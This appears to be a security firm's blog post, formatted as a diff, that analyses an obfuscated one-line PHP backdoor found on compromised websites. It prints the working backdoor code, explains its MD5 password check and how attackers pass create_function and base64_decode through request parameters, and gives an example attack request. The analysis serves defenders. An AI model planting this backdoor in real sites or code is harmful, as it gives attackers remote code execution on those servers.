@@ -1,0 +1,40 @@
+PHP Backdoor Obfuscated One Liner
+
+In the past, I have explained how small one line PHP backdoors use obfuscation and strings of code in HTTP requests to pass attacker’s commands to backdoors. Today, I’ll highlight another similar injection example and describe some of the malicious behavior we’ve seen recently on compromised websites.
+Obfuscated PHP Backdoor
+Discovered by our Remediation team, this PHP backdoor variant uses a method to hide the create_function which requires the attacker to provide it in their request.
+if(md5(@$_REQUEST['_p'].'9doijoFp6B2svk2XAhpUl')=='9518e40685a1e104da755c294e656731'){$filter1=$_REQUEST['_f1'];$filter2=$_REQUEST['_f2'];$res=$filter1('',$filter2($_REQUEST['_i']));$res();}
+
+The snippet displays a long string of code, with the entire contents bunched into a single line. This is a common tactic used by attackers, who leverage the fact that not all text editors wrap text by default.
+A quick glance by a user might only show a partial string, with the majority of the malicious contents concealed using whitespace to push the malicious code from view unless the user scrolls horizontally in their text editor.
+Empty white space hiding malware injection when viewed without any text wrapping
+Once the PHP is beautified, however, it becomes much easier to read.
+if (md5(@$_REQUEST['_p'] . '9doijoFp6B2svk2XAhpUl') == '9518e40685a1e104da755c294e656731')
+{
+$filter1 = $_REQUEST['_f1'];
+$filter2 = $_REQUEST['_f2'];
+$res = $filter1('', $filter2($_REQUEST['_i']));
+$res();
+}
+
+How the Backdoor Is Used
+if (md5(@$_REQUEST['_p'] . '9doijoFp6B2svk2XAhpUl') == '9518e40685a1e104da755c294e656731')
+
+In order to run, the attacker must provide a string of data in the _p $_REQUEST parameter which is then concatenated with the hard coded string of text 9doijoFp6B2svk2XAhpUl and sent to the backdoor. An MD5 hash value is generated from the concatenated text string, which must match the hard coded hash value of 9518e40685a1e104da755c294e656731.
+All of this means that if you don’t know the correct value to use for _p, then the backdoor won’t let you harness the rest of its functionality.
+If the correct value for _p is provided, the PHP continues running through the backdoor’s code. We know from past posts that a popular function used by attackers is to use create_function to obfuscate their code, but that function isn’t present here:
+{
+$filter1 = $_REQUEST['_f1'];
+$filter2 = $_REQUEST['_f2'];
+$res = $filter1('', $filter2($_REQUEST['_i']));
+$res();
+}
+
+This is because create_function is expected to be provided by the attacker through the _f1 HTTP request parameter. The payload for the created function should be sent within the same HTTP request, but assigned to the _i parameter.
+To make it easier for the attacker to submit the _i payload, base64 encoded values are used, which then requires the PHP function base64_decode to decode it back to plaintext. The base64_decode is provided by the attacker in the _f2 request parameter.
+The attacker’s HTTP request will end up looking similar to this example:
+test.php?_p=test&_f1=create_function&_f2=base64_decode&_i=ZWNobyAndGhpcyBpcyBzdXBlciBldmlsIGNvZGUhJzs=
+
+Conclusion & Mitigation Steps
+If you think that your website may have a PHP backdoor, the first step is to remove the malware from your environment. It is critical to locate and eliminate all backdoors, otherwise your site can get quickly reinfected.
+That being said, finding a website backdoor can be a difficult process, as attackers leverage all sorts of techniques and tactics to obfuscate their code and conceal malicious behavior. If you need a hand finding and removing malware from your website, we can help.
